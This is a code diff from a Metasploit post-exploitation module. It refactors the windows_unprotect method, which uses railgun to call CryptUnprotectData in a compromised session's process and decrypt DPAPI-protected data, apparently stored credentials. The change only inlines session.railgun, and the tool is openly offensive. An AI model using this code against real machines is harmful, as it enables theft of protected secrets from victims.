@@ -639,7 +639,6 @@ class MetasploitModule < Msf::Post
 
   def windows_unprotect(data)
     data = Rex::Text.decode_base64(data)
-    rg = session.railgun
     pid = session.sys.process.getpid
     process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
     mem = process.memory.allocate(data.length + 200)
@@ -648,12 +647,12 @@ class MetasploitModule < Msf::Post
     if session.sys.process.each_process.find { |i| i["pid"] == pid } ["arch"] == "x86"
       addr = [mem].pack("V")
       len = [data.length].pack("V")
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
+      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
       len, addr = ret["pDataOut"].unpack("V2")
     else
       addr = Rex::Text.pack_int64le(mem)
       len = Rex::Text.pack_int64le(data.length)
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
+      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
       pData = ret["pDataOut"].unpack("VVVV")
       len = pData[0] + (pData[1] << 32)
       addr = pData[2] + (pData[3] << 32)
